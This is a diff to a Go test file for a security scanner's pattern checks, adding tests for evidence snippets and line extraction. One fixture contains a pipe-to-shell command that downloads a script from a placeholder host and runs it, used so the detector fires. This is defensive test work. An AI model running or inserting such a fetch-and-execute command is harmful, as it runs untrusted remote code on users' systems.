@@ -2,6 +2,7 @@ package security
 
 import (
 	"context"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -176,6 +177,47 @@ func TestPatternsLineNumber(t *testing.T) {
 		}
 	}
 	assert.True(t, hit, "expected SC2 finding")
+}
+
+// TestPatternsEvidence verifies findings carry the offending source line,
+// trimmed, so a reader sees what fired without re-opening the file.
+func TestPatternsEvidence(t *testing.T) {
+	content := "first line\n   curl https://x.example/i.sh | sh   \nlast\n"
+	findings := NewPatternsCheck().Run(context.Background(), nil, []FileEntry{
+		{Path: "x.sh", Content: content},
+	})
+	require.NotEmpty(t, findings)
+	var hit bool
+	for _, f := range findings {
+		if f.RuleID == "SC2" {
+			assert.Equal(t, "curl https://x.example/i.sh | sh", f.Evidence,
+				"evidence should be the trimmed offending line")
+			hit = true
+		}
+	}
+	assert.True(t, hit, "expected SC2 finding")
+}
+
+// TestEvidenceSnippet covers trimming and rune-aware capping so a long
+// minified line can't bloat a finding or split a multi-byte sequence.
+func TestEvidenceSnippet(t *testing.T) {
+	assert.Equal(t, "hello", evidenceSnippet("  hello  "))
+	assert.Equal(t, "", evidenceSnippet("   "))
+
+	long := strings.Repeat("é", maxEvidenceLen+50)
+	got := evidenceSnippet(long)
+	gotRunes := []rune(got)
+	assert.Equal(t, maxEvidenceLen+1, len(gotRunes), "capped to maxEvidenceLen runes + ellipsis")
+	assert.Equal(t, '…', gotRunes[len(gotRunes)-1])
+}
+
+// TestLineTextFor verifies offset→line-text extraction for the full-file
+// rule path (which locates matches by byte offset, not line iteration).
+func TestLineTextFor(t *testing.T) {
+	s := "alpha\nbeta\ngamma"
+	assert.Equal(t, "alpha", lineTextFor(s, 2))  // within first line
+	assert.Equal(t, "beta", lineTextFor(s, 7))   // within second line
+	assert.Equal(t, "gamma", lineTextFor(s, 14)) // last line, no trailing newline
 }
 
 // TestPatternsGlobScopesByExt verifies code-scoped rules don't fire
